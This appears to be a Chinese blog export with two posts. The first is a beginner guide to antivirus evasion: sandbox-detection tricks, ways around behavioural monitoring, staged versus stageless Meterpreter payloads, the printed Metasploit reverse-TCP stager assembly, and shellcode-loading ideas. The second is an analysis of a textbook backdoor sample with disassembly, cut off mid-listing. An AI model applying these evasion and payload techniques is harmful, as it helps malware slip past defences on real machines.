<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131226917.png" alt="image-20211012131226917"></p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131218800.png" alt="image-20211012131218800" style="zoom:67%;">



<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131521189.png" alt="image-20211012131521189"></p>
<p>小红伞没有识别出，所以给了警告。</p>
<p>附：现在很多杀软也会针对 sleep 函数进行识别，一般正常的文件执行不会sleep，这时候杀软不得注意一下？</p>
<h3 id="0x02-动态查杀（主动防御）"><a href="#0x02-动态查杀（主动防御）" class="headerlink" title="0x02 动态查杀（主动防御）"></a>0x02 动态查杀（主动防御）</h3><p>动态查杀指的是 程序在运行的过程中执行了某些敏感操作，导致杀软查杀。</p>
<p>谈到动态查杀不得不提一个东西叫沙盒。</p>
<p>沙盒：也叫启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为</p>
<p>沙盒模拟的常见特征：</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>原因</th>
<th>bypass</th>
</tr>
</thead>
<tbody><tr>
<td>内存较小</td>
<td>不影响计算机正常运行</td>
<td>检测计算机内存是不是很小(判断是否是真实计算机)</td>
</tr>
<tr>
<td>时间较快</td>
<td>沙盒内置的时间速度比现实世界要快，提高查杀速度，沙盒中的时间流逝很快</td>
<td>c语言函数判断1s是否有1000ms/判断是否是utc时间</td>
</tr>
<tr>
<td>进程或文件不完整</td>
<td>减少杀毒软件运行时对计算机的消耗</td>
<td>判断操作系统进程的个数/调用不可能存在的文件</td>
</tr>
<tr>
<td>io设备缺失</td>
<td>鼠标键盘等事件大部分沙盒都没有</td>
<td>检测驱动 usb等/判断鼠标的移动速度等</td>
</tr>
</tbody></table>
<p>其实主要就是找一台真实的计算机和沙盒的区别到底在哪，找到那些真实的计算机具有而模拟的计算机无法具有的特征，进行绕过即可，思路很简单，也很广，自己拓展会发现更多有意思的点。</p>
<p>下面说一下杀软监控动态查杀的点：</p>
<h4 id="计算机相关"><a href="#计算机相关" class="headerlink" title="计算机相关"></a>计算机相关</h4><ol>
<li><p>系统服务（指的是这些）</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014111540437.png" alt="image-20211014111540437" style="zoom:50%;"></li>
<li><p>注册表（键值） 修改注册表的行为一般都是敏感行为（高危添加用户、删除用户，没有十足把握bypass，还是算了）</p>
</li>
<li><p>组策略</p>
</li>
<li><p>防火墙</p>
</li>
<li><p>敏感程序（cmd powershell wmi psexec bitsadmin rundll 等）</p>
</li>
<li><p>各种 win32api</p>
<p>这里强调一下，监控进程调用的api不止是api名字，还包括api的 调用顺序、调用源、参数等等 。 相应的bypass，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用实现同样功能的api替换</span><br><span class="line">重写对应的api</span><br><span class="line">调用0环的api绕过3环杀软</span><br></pre></td></tr></table></figure>

<p>等等，肯定不止这些， 说起来很容易，但具体实现需要很深的底层功底，起码对Windows操作系统的底层实现，win32api等很熟悉，这就需要内功。</p>
</li>
<li><p>文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:/windows/system32   </span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\tmp等敏感文件夹（cs、msf都会在tmp文件夹下生成一些东西）</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>绕过</strong>：<code>白加黑</code>  算是一个很好的方法，指的是利用Windows系统的一些白文件去执行相应的敏感操作，就不会触发杀软警告，想一想，有哪个普通的程序去执行添加用户的操作呢？</p>
<p>说到底，白加黑解决的是 Windows里面 <code>信任与权限</code>的问题，Windows 都相信你，它一个杀软有什么办法，权限指的是你的权限是否比杀软的权限高，如果你在0环，杀软在3环，它也没有权限来管你，更不用说kill。</p>
<h4 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h4><p>1.<strong>流量特征</strong>: cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信，这也是c2的常规通信手法，但未经修改的profile 和证书，很容易被检测到。</p>
<p>2.<strong>内容特征</strong>：data字段是否存在命令相关的关键词加密特征（payload是否通讯加密，明文传输就会被查杀）  </p>
<p>3.<strong>结构特征</strong>: 是否存在已知远控的通讯结构（ cs 中 beacon 有 sleep）</p>
<p>4.<strong>IP</strong> : 是否被情报系统标记为恶意</p>
<p><strong>绕过</strong>:</p>
<ul>
<li><p>tcp分段：指的是数据包在传输过程中切分后以小段传输(效果也不错，但是网络连接不好很容易断掉)</p>
</li>
<li><p>内容加密：针对传输的内容，比如那些执行命令的字符串等等，加密混淆，加密还是不要用简单的编码，你简单的base64编码一下，杀软、edr等还是可以检测到，最好用非对称加密</p>
</li>
<li><p>使用合法证书 ： 这个自己找渠道获得吧……</p>
</li>
</ul>
<h3 id="payload基本结构"><a href="#payload基本结构" class="headerlink" title="payload基本结构"></a>payload基本结构</h3><p><strong>分段传输</strong>:</p>
<p>eg: </p>
<p>msfvenom 的<code>meterpreter/reverse_https</code>模块</p>
<p>stager：</p>
<p>stage0：初始shellcode（通常称为<em>stage0</em>）会创建一个新的连接到攻击者的机器并将更大的有效载荷（stage1）读入内存。收到有效载荷后，stage0 会将控制权交给新的更大的有效载荷。stage0 只负责建立通信连接，不能够执行命令(getuid、getsystem等)</p>
<p>stage1（metsrv）：stage0执行完后发送stage1到目标机器并写入内存，弹回meterpreter会话，我们在meterpreter里执行的命令，还有加载的模块（load kiwi等）都是stage1的功劳</p>
<p>这里 Sending stage （175174 bytes） 可以看到体积比较大，就是stage1</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012232906258.png" alt="image-20211012232906258"></p>
<p>很多分段加载骚思路也是基于stager来实现，初始投递的文件非常小，载入内存后，在内存中解密加载  加载器，然后加载器再解密加载shellcode。具体实现方法也多种多样，各种语言，c#，go等。</p>
<p>更多骚思路自行扩展……</p>
<p><strong>整段传输</strong>：</p>
<p>一次性发送很大的stage</p>
<p><code>meterpreter_reverse_https</code></p>
<p>stageless：</p>
<p>建立通信连接+执行命令</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012232942431.png" alt="image-20211012232942431"></p>
<p>可以看到两种stage的体积差别</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014115158319.png" alt="image-20211014115158319" style="zoom:67%;">

<p>显然这种效果不如stager的效果好。</p>
<p>再简单看一下stager的汇编，不需要全部看懂，只有这么多代码，找到关键的功能</p>
<p><code>try_connect</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4</span><br><span class="line">; Version: 1.0 (24 July 2009)</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 32]</span><br><span class="line"></span><br><span class="line">; Input: EBP must be the address of &#x27;api_call&#x27;.</span><br><span class="line">; Output: EDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  push 0x00003233        ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.</span><br><span class="line">  push 0x5F327377        ; ...</span><br><span class="line">  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.</span><br><span class="line">  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  </span><br><span class="line">  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )</span><br><span class="line">  sub esp, eax           ; alloc some space for the WSAData structure</span><br><span class="line">  push esp               ; push a pointer to this stuct</span><br><span class="line">  push eax               ; push the wVersionRequested parameter</span><br><span class="line">  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );</span><br><span class="line">  </span><br><span class="line">  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.</span><br><span class="line">  push eax               ; push null for reserved parameter</span><br><span class="line">  push eax               ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  push eax               ; we do not specify a protocol</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push SOCK_STREAM</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push AF_INET</span><br><span class="line">  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  xchg edi, eax          ; save the socket for later, don&#x27;t care about the value of eax after this</span><br><span class="line"></span><br><span class="line">set_address:</span><br><span class="line">  push byte 0x05         ; retry counter</span><br><span class="line">  push 0x0100007F        ; host 127.0.0.1</span><br><span class="line">  push 0x5C110002        ; family AF_INET and port 4444</span><br><span class="line">  mov esi, esp           ; save pointer to sockaddr struct</span><br><span class="line">  </span><br><span class="line">try_connect:</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  push esi               ; pointer to the sockaddr struct</span><br><span class="line">  push edi               ; the socket</span><br><span class="line">  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call ebp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line"></span><br><span class="line">  test eax,eax           ; non-zero means a failure</span><br><span class="line">  jz short connected</span><br><span class="line"></span><br><span class="line">handle_failure:</span><br><span class="line">  dec dword [esi+8]</span><br><span class="line">  jnz short try_connect</span><br><span class="line"></span><br><span class="line">failure:</span><br><span class="line">  push 0x56A2B5F0        ; hardcoded to exitprocess for size</span><br><span class="line">  call ebp</span><br><span class="line"></span><br><span class="line">connected:</span><br></pre></td></tr></table></figure>

<p>因此可以看出stager仅仅是连接功能，而不能够进行其他操作。可以自己去GitHub找msf的模块来对比，文末也会放上链接。</p>
<p>​    还要提一点：msf加载的各种命令 比如powershell  kiwi这种，是各种反射注入的dll，反射注入到执行的进程上</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012234041565.png" alt="image-20211012234041565"></p>
<p>其中的msf中的<code>进程迁移</code>：是在无文件落地的情况下，将内存中的shellcode注入到其他进程。</p>
<p>关于无文件落地，比较复杂，我太菜了，等研究到再单独写一篇…</p>
<p>下面说一点免杀的方法和思路：</p>
<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>因为shellcode在程序里面很容易被查杀，像下面是最常用的加载shellcode的方式，内联汇编执行，函数指针执行，强制转换等等，当然很明显，这几种现在都是不免杀的。</p>
<p>要提一下内联汇编中的 <code>_emit 0xff _emit 0xE0 </code>是硬编码执行，与 <code>jmp eax /call eax </code>的作用是一样的，网上有很多文章说是花指令，用来干扰杀软的，但在我实际测试中，删掉是无法加载shellcode的。</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014103917056.png" alt="image-20211014103917056" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014103942943.png" alt="image-20211014103942943" style="zoom:67%;">





<p>这里的分离免杀是用 msfvenom 生成一段raw格式的shellcode 放在 png 图片里，然后加载器 将shellcode写入内存中</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013000137040.png" alt="image-20211013000137040" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013000204080.png" alt="image-20211013000204080" style="zoom:67%;">

<p>经测试，可以简单的过掉火绒，360没有测试，会被小红伞杀。因为这里将shellcode写入内存的方式还是前面说的最简单的方式，换橙其他加载方式，应该也是可以过掉的。</p>
<p>分离免杀包括但不限于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode从文本提取 </span><br><span class="line">shellcode与加载器分离</span><br><span class="line">远程加载shellcode（shellcode放在另一台主机上，走http协议下载）</span><br><span class="line">管道运输</span><br><span class="line">隐写在图片上，powershell加载</span><br></pre></td></tr></table></figure>

<p>具体的其他分离免杀可以去网上找对应的实现，这里仅仅介绍并提供思路。</p>
<p>当然传统的这些函数早已被杀软加入豪华套餐</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WinHttpOpen</span><br><span class="line">WinHttpConnect</span><br><span class="line">WinHttpOpenRequest</span><br><span class="line">WinHttpSendRequest</span><br><span class="line">WinHttpReceiveResponse</span><br><span class="line">WinHttpQueryDataAvailable</span><br><span class="line">WinHttpReadData</span><br><span class="line">WinHttpCloseHandle</span><br></pre></td></tr></table></figure>

<p>但幸运的是，Windows 提供了许多不同的库，可用于下载数据，例如<code>winInet、WinHTTP 和 Windows Sockets</code>。通过切换到更加手动的基于套接字的实现 ，如果使用这些第三方库或使用系统自带的下载命令，被杀软查杀的概率会小很多。</p>
<p><strong>其他免杀思路</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">远程线程注入</span><br><span class="line">远程加载</span><br><span class="line">管道传输</span><br><span class="line">白加黑</span><br><span class="line">父进程调用子进程</span><br></pre></td></tr></table></figure>

<p>等等，还有其他骚思路……自己去想</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>做免杀，首先要原理烂熟于心，得知道为什么会被杀，杀的哪里，才有目的的去做，而不是啥都不懂，就去盲杀（在不清楚杀软规则好像也只能这样… 但是效率很低嘛）</p>
<p>前面也介绍了各种免杀的思路，可以自己去扩充，上面主要是基于c/cpp来实现，也可以用其他语言 powershell /c#/go/nim/python等来实现。方法还是很多的，但前提是要有一定的底层知识储备。</p>
<p>下面两张图刚开始看会觉得很空，但仔细研究会发现做免杀就是根据这个步骤来的，整个流程很清晰，只不过在实现的过程中需要大量的底层知识来支撑罢了。</p>
<p>希望可以给大家带来一点帮助，祝大家早日拳打火眼，脚踢卡巴斯基，bypass全球杀软~</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013003245103.png" alt="image-20211013003245103"></p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013003337672.png" alt="image-20211013003337672"></p>
<p>参考链接：</p>
<p><a href="https://www.secpulse.com/archives/132175.html">恶意程序编写之免杀基础 - SecPulse.COM | 安全脉搏</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25894246">免杀的艺术：PE文件后门的植入（二） - 知乎 (zhihu.com)</a></p>
<p><a href="https://cutecuteyu.github.io/2021/03/03/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">https://cutecuteyu.github.io/2021/03/03/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</a></p>
<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm</a></p>
<p><a href="https://xz.aliyun.com/t/9499">https://xz.aliyun.com/t/9499</a></p>
<p><a href="https://blog.f-secure.com/dynamic-shellcode-execution/">https://blog.f-secure.com/dynamic-shellcode-execution/</a></p>
<p><a href="https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/">https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/</a></p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>加密后门的木马分析</title>
    <url>/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>本文首发于跳跳糖社区，原文链接: <a href="https://tttang.com/archive/1342/">https://tttang.com/archive/1342/</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>样本地址：<a href="https://github.com/0range-x/Virus-sample/blob/master/Chapter_9L/Lab09-01.exe">https://github.com/0range-x/Virus-sample/blob/master/Chapter_9L/Lab09-01.exe</a><br>是书中的一个案例样本，木马加了启动参数，还有启动密码，尝试分析木马的功能和行为</p>
<p>首先crack掉木马的启动密码，根据不同的启动参数分析木马的不同功能，最终建立socket通信。</p>
<h2 id="0x01-大致浏览"><a href="#0x01-大致浏览" class="headerlink" title="0x01 大致浏览"></a>0x01 大致浏览</h2><p>按照惯例，先看下导入表，有很多导入函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSCManagerA：建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</span><br><span class="line">OpenServiceA: 打开一个已存在的服务</span><br><span class="line">ChangeServiceConfigA：更改服务的配置参数</span><br><span class="line">CloseServiceHandle：关闭指向服务控制管理对象的句柄，也可能是指向服务对象的句柄</span><br><span class="line">CreateServiceA：创建服务对象并将其添加到指定的服务控制管理器数据库</span><br><span class="line">RegDeleteValueA：删除注册表中的键值</span><br><span class="line">RegCreateKeyExA：创建指定的注册表项。如果键已经存在，函数将打开它</span><br><span class="line">RegSetValueExA：设置注册表键值的数据和类型</span><br><span class="line">RegOpenKeyExA：打开指定的注册表项</span><br><span class="line">RegQueryValueExA：检索与开放注册表键关联的指定值名称的类型和数据。与RegOpenKeyExA功能类似</span><br><span class="line">DeleteService：从服务控制管理器数据库中删除的指定服务</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.text:0040101B                 call    ds:RegOpenKeyExA</span><br><span class="line">.text:0040103A                 call    ds:RegQueryValueExA</span><br><span class="line">.text:0040104D                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:004011A8                 call    ds:RegCreateKeyExA</span><br><span class="line">.text:004011D5                 call    ds:RegSetValueExA</span><br><span class="line">.text:004011E6                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:00401233                 call    ds:RegCreateKeyExA</span><br><span class="line">.text:0040124D                 call    ds:RegDeleteValueA</span><br><span class="line">.text:00401260                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:004012AE                 call    ds:RegOpenKeyExA</span><br><span class="line">.text:004012DD                 call    ds:RegQueryValueExA</span><br><span class="line">.text:004012F9                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:004014FC                 call    ds:CreateFileA</span><br><span class="line">.text:00401525                 call    ds:GetFileTime</span><br><span class="line"></span><br><span class="line">.text:00401560                 call    ds:CreateFileA</span><br><span class="line">.text:00401579                 call    ds:SetFileTime</span><br><span class="line"></span><br><span class="line">.text:004015C8                 call    ds:GetSystemDirectoryA</span><br><span class="line"></span><br><span class="line">.text:0040165E                 call    ds:WSAStartup</span><br><span class="line">.text:00401676                 call    ds:gethostbyname</span><br><span class="line">.text:0040168B                 call    ds:WSACleanup</span><br><span class="line">.text:004016A1                 call    ds:socket</span><br><span class="line">.text:004016B4                 call    ds:WSACleanup</span><br><span class="line">.text:004016E2                 call    ds:htons</span><br><span class="line">.text:004016FE                 call    ds:connect</span><br><span class="line">.text:0040170F                 call    ds:closesocket</span><br><span class="line">.text:0040171E                 call    ds:WSACleanup</span><br><span class="line"></span><br><span class="line">.text:004017FA                 call    ds:send</span><br><span class="line"></span><br><span class="line">.text:004018B8                 call    ds:CreateFileA</span><br><span class="line">.text:00401906                 call    ds:ReadFile</span><br><span class="line">.text:00401910                 call    ds:GetLastError</span><br><span class="line"></span><br><span class="line">.text:00401A65                 call    ds:recv</span><br><span class="line">.text:00401A84                 call    ds:WriteFile</span><br><span class="line"></span><br><span class="line">.text:004020C7                 call    ds:Sleep</span><br><span class="line"></span><br><span class="line">.text:004026CC                 call    ds:OpenSCManagerA</span><br><span class="line">.text:004026FB                 call    ds:OpenServiceA</span><br><span class="line">.text:00402730                 call    ds:ChangeServiceConfigA</span><br><span class="line">.text:00402741                 call    ds:CloseServiceHandle</span><br><span class="line">.text:0040285E                 call    ds:ExpandEnvironmentStringsA</span><br><span class="line">.text:00402880                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:004028A1                 call    ds:CopyFileA</span><br><span class="line"></span><br><span class="line">.text:00402915                 call    ds:OpenSCManagerA</span><br><span class="line">.text:00402977                 call    ds:DeleteService</span><br><span class="line">.text:00402988                 call    ds:CloseServiceHandl</span><br><span class="line"></span><br><span class="line">.text:00405683                 call    ds:HeapReAlloc</span><br><span class="line">.text:00408367                 call    ebp ; VirtualAllo</span><br><span class="line">.text:00408428                 call    ds:VirtualFree</span><br><span class="line">.text:0040843F                 call    ds:HeapFree</span><br></pre></td></tr></table></figure>

<p>ok，大概找一下这些函数的位置，为后面做准备</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116095315886.png" alt="image-20211116095315886"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ShellExecuteA: 运行一个外部程序，或者打开一个已注册的文件、打开一个目录、打印文件等等功能，它可以打开电脑内的任何文件，也可以打开URL</span><br></pre></td></tr></table></figure>

<p>下面的函数已经老生常谈了，建立socket通信使用</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116095433324.png" alt="image-20211116095433324"></p>
<p>大概猜测一下，这个程序做了什么呢？创建服务，修改注册表，建立通信，应该是个后门。</p>
<h2 id="0x02-详细分析"><a href="#0x02-详细分析" class="headerlink" title="0x02 详细分析"></a>0x02 详细分析</h2><h3 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h3><p>找到main函数</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117094657231.png" alt="image-20211117094657231"></p>
<p>先拖到od里面</p>
<p>emmm？竟然是从<code>403896</code>开始？再看下调用堆栈，很明显，这里不是程序真正的入口，</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111303286.png" alt="image-20211116111303286"></p>
<p>直到 <code>403945</code>处，显示终止，那么回去重新看</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111511180.png" alt="image-20211116111511180"></p>
<p>在ida中发现它是对main函数的调用</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111640282.png" alt="image-20211116111640282"></p>
<p>回到od，接着F7，step in -&gt; 单步步入</p>
<p>来到这里，继续F7+F8一步步分析</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111836468.png" alt="image-20211116111836468"></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095143083.png" alt="image-20211117095143083"></p>
<p>f7单步进入 <code>403945</code></p>
<p>这里才是函数的入口</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095438337.png" alt="image-20211117095438337"></p>
<p>一步步看，F8，step-&gt;over，往上看看</p>
<p>前面主要是一些传参，push 字符串入栈</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116112158064.png" alt="image-20211116112158064"></p>
<p>到<code>402AFD</code>处，对比arg(命令行参数的数量)是否为1，因为我们这里前面并没有指定任何参数，所以这里不跳转，继续执行，并且跳转到<code>401000</code>处</p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116112320840.png" alt="image-20211116112320840"></p>
<p>ok，回到前面<code>402AFD</code>处继续向下分析</p>
<p><code>402B08</code>这里，执行<code>test eax,eax</code>，检测eax的值是不是0，因为前面 <code>xor eax,eax</code>后，所以eax是0，这里成功跳转到 <code>402410</code></p>
<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116114057640.png" alt="image-20211116114057640"></p>
<p>因为这个函数比较长，无法完整截图，所以这里贴上代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00402410                 push    ebp</span><br><span class="line">.text:00402411                 mov     ebp, esp</span><br><span class="line">.text:00402413                 sub     esp, 208h</span><br><span class="line">.text:00402419                 push    ebx</span><br><span class="line">.text:0040241A                 push    esi</span><br><span class="line">.text:0040241B                 push    edi</span><br><span class="line">.text:0040241C                 push    104h            ; nSize</span><br><span class="line">.text:00402421                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00402427                 push    eax             ; lpFilename</span><br><span class="line">.text:00402428                 push    0               ; hModule</span><br><span class="line">.text:0040242A                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:00402430                 push    104h            ; cchBuffer</span><br><span class="line">.text:00402435                 lea     ecx, [ebp+Filename]</span><br><span class="line">.text:0040243B                 push    ecx             ; lpszShortPath</span><br><span class="line">.text:0040243C                 lea     edx, [ebp+Filename]</span><br><span class="line">.text:00402442                 push    edx             ; lpszLongPath</span><br><span class="line">.text:00402443                 call    ds:GetShortPathNameA</span><br><span class="line">.text:00402449                 mov     edi, offset aCDel ; &quot;/c del &quot;</span><br><span class="line">.text:0040244E                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:00402454                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402457                 xor     eax, eax</span><br><span class="line">.text:00402459                 repne scasb</span><br><span class="line">.text:0040245B                 not     ecx</span><br><span class="line">.text:0040245D                 sub     edi, ecx</span><br><span class="line">.text:0040245F                 mov     esi, edi</span><br><span class="line">.text:00402461                 mov     eax, ecx</span><br><span class="line">.text:00402463                 mov     edi, edx</span><br><span class="line">.text:00402465                 shr     ecx, 2</span><br><span class="line">.text:00402468                 rep movsd</span><br><span class="line">.text:0040246A                 mov     ecx, eax</span><br><span class="line">.text:0040246C                 and     ecx, 3</span><br><span class="line">.text:0040246F                 rep movsb</span><br><span class="line">.text:00402471                 lea     edi, [ebp+Filename]</span><br><span class="line">.text:00402477                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:0040247D                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402480                 xor     eax, eax</span><br><span class="line">.text:00402482                 repne scasb</span><br><span class="line">.text:00402484                 not     ecx</span><br><span class="line">.text:00402486                 sub     edi, ecx</span><br><span class="line">.text:00402488                 mov     esi, edi</span><br><span class="line">.text:0040248A                 mov     ebx, ecx</span><br><span class="line">.text:0040248C                 mov     edi, edx</span><br><span class="line">.text:0040248E                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402491                 xor     eax, eax</span><br><span class="line">.text:00402493                 repne scasb</span><br><span class="line">.text:00402495                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:00402498                 mov     ecx, ebx</span><br><span class="line">.text:0040249A                 shr     ecx, 2</span><br><span class="line">.text:0040249D                 rep movsd</span><br><span class="line">.text:0040249F                 mov     ecx, ebx</span><br><span class="line">.text:004024A1                 and     ecx, 3</span><br><span 